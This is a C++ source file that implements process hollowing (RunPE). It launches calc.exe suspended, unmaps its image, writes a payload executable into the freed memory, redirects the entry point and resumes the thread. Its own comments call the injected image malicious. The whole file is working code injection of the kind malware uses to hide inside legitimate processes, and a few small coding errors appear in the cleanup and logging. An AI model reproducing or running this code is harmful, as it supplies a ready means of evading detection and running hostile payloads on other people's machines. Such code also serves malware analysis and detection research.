/*

Process Hollowing Example

*/
//#include "ntdll_undoc.h" A combination of windows.h and ntdll.h
#include <windows.h>
#include <fstream>
#include <winuser.h>
#include <iostream>
#include "myntdll.h"

// Initialize variables
HANDLE hFile;
LPVOID image, base, mem;
PROCESS_INFORMATION pi;
STARTUPINFO si; 
SIZE_T dwSize, numBytes;
DWORD read, i;
PIMAGE_DOS_HEADER pIDH;
PIMAGE_NT_HEADERS pINH;
PIMAGE_SECTION_HEADER pISH;


void RunPE(LPCWSTR const& target, LPCWSTR const& payload) {

    ZeroMemory(&pi, sizeof(pi)); 
    ZeroMemory(&si, sizeof(si)); 
  
    hFile = CreateFile(payload, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL); // Open payload file

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("\nUnable to open payload file. CreateFile failed with error: %d\n", GetLastError());
        return;
    }

    printf("\nPayload file opened successfully");

    dwSize = GetFileSize(hFile, NULL); // Get payload file size

    image = VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // Creates pointer to allocated memory

    if (!ReadFile(hFile, image, dwSize, &read, NULL)) { // Read payload executable's contents to the "read" DWORD
        printf("\nUnable to read payload contents. ReadFile failed with error: %d\n", GetLastError());
        return;
    }

    printf("\nPayload (source) contents read successfully");

    if (!CreateProcess(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) { //Creates "target" process in a suspended state
        printf("\nUnable to run the target process. CreateProcess failed with error: %d\n", GetLastError());
        return;
    }

    printf("\nTarget process created successfully");    
   
    pIDH = (PIMAGE_DOS_HEADER)image;
    pINH = (PIMAGE_NT_HEADERS)((LPBYTE)image + pIDH->e_lfanew); // Create variables that store the PE header information of the payload image

    if (pIDH->e_magic != IMAGE_DOS_SIGNATURE) { // Check for valid executable
        printf("\nError: Invalid executable format.\n");
        return;
    }

    printf("\nValid executable format");

    PCONTEXT CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));   // Allocate space for context
    CTX->ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, (LPCONTEXT)CTX)) { // Get target process's thread context 
        printf("\nUnable to get thread context. GetThreadContext failed with error: %d\n", GetLastError());
        return;
    }

    printf("\nSuccessfully retrieved target thread context");

    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)(CTX->Ebx + 8), &base, sizeof(LPVOID), NULL)) { // Assign pointer to suspended process's executable section
        printf("\nUnable to read target process's thread context. ReadProcessMemory failed with error: %d\n", GetLastError()); 
        return;
    }

    printf("\nTarget process's thread context read");

    // Unmap suspended process's executable section 
    if (NtUnmapViewOfSection(pi.hProcess, base)) {
        printf("\nUnable to unmap target process's executable section. NtUnmapViewOfSection failed with error: %d\n", GetLastError());
        return;
    }


    // Write malicious image to suspended process's 


    printf("\nTarget process's executable section unmapped from address: %#x\n", base);

    // Allocate memory in suspended process's address space for malicious memory buffer to be written to
    mem = VirtualAllocEx(pi.hProcess, base, pINH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!mem) {
        printf("\nError: Unable to allocate memory in child process. VirtualAllocEx failed with error %d\n", GetLastError());
        return;
    }

    printf("\nMemory allocated in target process for payload at address: %#x\n", mem);

    // Write payload into allocated memory under suspended process!
    if (!WriteProcessMemory(pi.hProcess, mem, image, pINH->OptionalHeader.SizeOfHeaders, &numBytes)) {
        printf("\nUnable to write to target process's allocated memory. WriteProcessMemory failed with error: %d\n", GetLastError());
        return;
    }

    printf("\nPayload successfully written: %#x\n", numBytes, "bytes");

    for (i = 0; i < pINH->FileHeader.NumberOfSections; i++) // Writes the rest of the payload executable's sections into the suspended process
    {
        pISH = (PIMAGE_SECTION_HEADER)((LPBYTE)image + pIDH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
        WriteProcessMemory(pi.hProcess, (LPVOID)((LPBYTE)mem + pISH->VirtualAddress), (LPVOID)((LPBYTE)image + pISH->PointerToRawData), pISH->SizeOfRawData, NULL); 
    }

    CTX->Eax = (DWORD)((LPBYTE)mem + pINH->OptionalHeader.AddressOfEntryPoint); // Sets the thread context's EAX register to the entry point adress

    printf("\nSuccessfully set the new entry point at: %#x\n", CTX->Eax);

    WriteProcessMemory(pi.hProcess, (PVOID)(CTX->Ebx + 8), &base, sizeof(PVOID), NULL); 

    SetThreadContext(pi.hThread, (LPCONTEXT)CTX); // Set new thread context to the suspended thread

    printf("\nSuccessfully set the context of the child process's primary thread.\n");

    ResumeThread(pi.hThread); // Resume (unsuspend) the target process thread (now running malicious code)

    printf("\nThread Resumed");
}


int main() {

    // Start RunPE method
	RunPE(L"C:\\windows\\system32\\calc.exe", L"C:\\Users\\Owner\\Desktop\\Test.exe");

    // Cleanup

    // CreateProcess cleanup
    WaitForSingleObject(pi.hProcess, INFINITE); // Waits for created process to exit
    CloseHandle(pi.hProcess); // Closes process handle 
    CloseHandle(pi.hThread); // Closes thread handle

    // CreateFile cleanup
    CloseHandle(hFile); // Closes payload file handle

    // VirtualAllocEx cleanup
    VirtualFree(image, 0, MEM_RELEASE);
    VirtualFree(GetCurrentProcess, NULL, MEM_RELEASE);
    return 0;
}
